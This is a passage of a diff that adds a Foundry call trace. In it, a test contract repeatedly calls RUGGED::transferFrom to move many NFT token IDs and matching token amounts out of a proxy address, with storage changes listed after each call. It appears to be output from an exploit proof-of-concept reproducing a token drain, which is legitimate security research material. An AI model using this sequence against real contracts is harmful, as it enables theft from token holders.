+    │   │   │   │   │   │   @ 0x617cb31547f437c7de7c40f0c8d3403e5581ba9130efde86c6ed1ec79aae0c3a: 481 → 6
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000053444835ec580000 → 0x0000000000000000000000000000000000000000000000006124fee993bc0000
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c9d57be9cfab68a41 → 0x00000000000000000000000000000000000000000000001c8f7707e953528a41
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ed: 1549 → 0
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 527 → 526
+    │   │   │   │   │   │   @ 0xa5b58a888a85842b891a760e4c76260aeafebf6e5cba275046506c0ed4973e49: 526 → 481
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606c0: 6901 → 1549
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d92: 0 → 6901
+    │   │   │   │   │   │   @ 0x74ac6e6de663790d1fa67c929abf27631d19f0eab8be5711cb672475f886477b: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3061)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3061)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000006124fee993bc0000 → 0x0000000000000000000000000000000000000000000000006f05b59d3b200000
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606b1: 3061 → 942
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d93: 0 → 3061
+    │   │   │   │   │   │   @ 0x9dc68992587370ea2610c4afc050f53202bac18c08fcce1050ad31cb1c1ebd7a: 525 → 466
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 526 → 525
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ec: 942 → 0
+    │   │   │   │   │   │   @ 0xea9262cafadd8bfc07ea22f5a9768a91a14a222ac5be91ac103413514df66635: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x005c6ed66846fc515ed43c3a7e1e64071c3e3de822e0aa78beb8011e21b028c7: 466 → 7
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 7 → 8
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c8f7707e953528a41 → 0x00000000000000000000000000000000000000000000001c81965135abee8a41
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1922)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1922)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x5210cb14e405bd2df6c11d4d4e9843e881d7a3b94df4ddacbbb4d6e9dd105ac3: 524 → 459
+    │   │   │   │   │   │   @ 0xe244fb5fa0726d3288990465e011945de3c92b84ad73f9120b1478d38a848c98: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000006f05b59d3b200000 → 0x0000000000000000000000000000000000000000000000007ce66c50e2840000
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606aa: 1922 → 5507
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c81965135abee8a41 → 0x00000000000000000000000000000000000000000000001c73b59a82048a8a41
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606eb: 5507 → 0
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 8 → 9
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d94: 0 → 1922
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 525 → 524
+    │   │   │   │   │   │   @ 0xf02b4f5de0eca8225398cd400fd9ef67aa21c25f9048703d3cd6531cdf6289ae: 459 → 8
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5301)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 5301)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d95: 0 → 5301
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 9 → 10
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c73b59a82048a8a41 → 0x00000000000000000000000000000000000000000000001c65d4e3ce5d268a41
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ea: 736 → 0
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000007ce66c50e2840000 → 0x0000000000000000000000000000000000000000000000008ac7230489e80000
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 524 → 523
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606b9: 5301 → 736
+    │   │   │   │   │   │   @ 0x7668c75f3f92f192135b8e5a2b43c6d6ebe6e285a2a3a5806f8b0fc775beda29: 523 → 474
+    │   │   │   │   │   │   @ 0xc44e133743d3b6295b51b8fa55477e753b7bed529f4012071e26ceeef19ce249: 474 → 9
+    │   │   │   │   │   │   @ 0x84288e8807e18f9bb068ee64f35b6c8f0658750997493a087aadee42e9297dd7: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 454)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 454)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 523 → 522
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c65d4e3ce5d268a41 → 0x00000000000000000000000000000000000000000000001c57f42d1ab5c28a41
+    │   │   │   │   │   │   @ 0xd0aac865598ead2df167f99cfa8c554668e5c7e85e12543a2972f26fa6d4639e: 452 → 10
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000008ac7230489e80000 → 0x00000000000000000000000000000000000000000000000098a7d9b8314c0000
+    │   │   │   │   │   │   @ 0xcfe472b282397ccc0aa9b6d353d29ea317de3c9712642b57f42dbd1770851de3: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x674b811aca00289cb6a2128b2be64b4b839922977c8eb07da9b9bc820eaf585c: 522 → 452
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 10 → 11
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d96: 0 → 454
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606a3: 454 → 7605
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e9: 7605 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2178)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2178)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xbf90d4ce4f35a20b42c6322f5edac4f5d6e008cdeb508abdc20a0b6ed7ebf625: 497 → 11
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000098a7d9b8314c0000 → 0x000000000000000000000000000000000000000000000000a688906bd8b00000
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e8: 5862 → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 0 → 2178
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d0: 2178 → 5862
+    │   │   │   │   │   │   @ 0xc3c7fb6a95b80182ab6b591f943a09f0ce415e4da4e0ecaf98679ba9df432a6d: 521 → 497
+    │   │   │   │   │   │   @ 0x2326ab6702a02ea3c0f5aad3d47f42d2fff3a2688695f6fc1c23bca41f6ac412: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 522 → 521
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 11 → 12
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c57f42d1ab5c28a41 → 0x00000000000000000000000000000000000000000000001c4a1376670e5e8a41
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8298)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8298)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 12 → 13
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e7: 7859 → 0
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 521 → 520
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d98: 0 → 8298
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000a688906bd8b00000 → 0x000000000000000000000000000000000000000000000000b469471f80140000
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c4a1376670e5e8a41 → 0x00000000000000000000000000000000000000000000001c3c32bfb366fa8a41
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606c4: 8298 → 7859
+    │   │   │   │   │   │   @ 0x852ad12a00fde3f2222effa6c54953732fa0c605b80022916d85aabff4788b60: 520 → 485
+    │   │   │   │   │   │   @ 0x6e371ab298d0c967d21204d9cdbf6c8cb65922083ca8f8a9f108502074c2fde5: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x8f2552b79692e047edc9e936c597204f5f37dd6b1f82511ddcc9274c9b87c401: 485 → 12
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4825)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4825)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000b469471f80140000 → 0x000000000000000000000000000000000000000000000000c249fdd327780000
+    │   │   │   │   │   │   @ 0xcca05c8af9cc32c65ebff8406e489e0983b1e51968f66b29cda56497843c7da7: 470 → 13
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 520 → 519
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 0 → 4825
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 13 → 14
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e6: 6356 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606b5: 4825 → 6356
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c3c32bfb366fa8a41 → 0x00000000000000000000000000000000000000000000001c2e5208ffbf968a41
+    │   │   │   │   │   │   @ 0x53dcf6523203eeda256c1c1448097d0049bd45fee760a74a01dbe05dbc1d65e9: 519 → 470
+    │   │   │   │   │   │   @ 0x5d33b97014764403556a041289e1b829afd50b25dbb655fd0f30ffd733fb45f4: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9307)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9307)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c2e5208ffbf968a41 → 0x00000000000000000000000000000000000000000000001c2071524c18328a41
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606c9: 9307 → 2507
+    │   │   │   │   │   │   @ 0x135cf6d18023edee06366a283ef957c17bc8b8cfaac068cc23d9db87ba8679d1: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 519 → 518
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 14 → 15
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000c249fdd327780000 → 0x000000000000000000000000000000000000000000000000d02ab486cedc0000
+    │   │   │   │   │   │   @ 0x2a8efdb7eb99fec03e881c964da846b7ab8695cb9d012a1b34c4ed2e3b70bdc8: 518 → 490
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 0 → 9307
+    │   │   │   │   │   │   @ 0x256f28a6cf5b51dfe30a7eb91f0d1b5def2a468611a6719352d94523d4142c40: 490 → 14
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e5: 2507 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2628)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2628)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000d02ab486cedc0000 → 0x000000000000000000000000000000000000000000000000de0b6b3a76400000
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ae: 2628 → 4842
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e4: 4842 → 0
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c2071524c18328a41 → 0x00000000000000000000000000000000000000000000001c12909b9870ce8a41
+    │   │   │   │   │   │   @ 0xe86a36d99c620136f888a1fd93be80f03b128dd47d208a7926fccc1281ec5638: 517 → 463
+    │   │   │   │   │   │   @ 0xa2133436b58a260f8d006c27fb45bb008e0a093024f113527ab0cae7cf6546f5: 463 → 15
+    │   │   │   │   │   │   @ 0x2b61c6014dd1218b919a2b632c5dcc2a61bdde548433a800da90f716b805a9ac: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 518 → 517
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 15 → 16
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 0 → 2628
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6115)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6115)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e3: 8137 → 0
+    │   │   │   │   │   │   @ 0xb0ec549f98926cc0f4ede0edd2042cf2df3d2301ffcaff963552b32db760c658: 478 → 16
+    │   │   │   │   │   │   @ 0x49a5885a350910d8cf696d3029d168cbf7f45629acb2ca670894878590048e18: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 517 → 516
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c12909b9870ce8a41 → 0x00000000000000000000000000000000000000000000001c04afe4e4c96a8a41
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000de0b6b3a76400000 → 0x000000000000000000000000000000000000000000000000ebec21ee1da40000
+    │   │   │   │   │   │   @ 0x35441fe7f8d0b19a83bd87b7e969450f401b3ab7732f1b720b32640769eccc25: 516 → 478
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606bd: 6115 → 8137
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 16 → 17
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 0 → 6115
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8565)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8565)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2f3a8ebe6e3a27c6a100d98d2ff91774a5b5385d01543103ad054dd5f6762dc5: 515 → 10
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000ebec21ee1da40000 → 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e2: 5153 → 0
+    │   │   │   │   │   │   @ 0x9a69d1e9401edab34a51f000f56e3ed9803e0fac3ef672554259888b014940d5: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604e9: 8565 → 5153
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 516 → 515
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 17 → 18
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 0 → 8565
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c04afe4e4c96a8a41 → 0x00000000000000000000000000000000000000000000001bf6cf2e3122068a41
+    │   │   │   │   │   │   @ 0x1aa357a72ac6cef8a628616782ff99e86fb3930371d27c8f70f7aa9e81dbf9db: 10 → 17
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7991)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7991)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604e7: 7991 → 1168
+    │   │   │   │   │   │   @ 0x248e9cd0385669887fa0db5e4efd97493422503ac37886170ad4f5ed3c7bc90a: 514 → 8
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e1: 1168 → 0
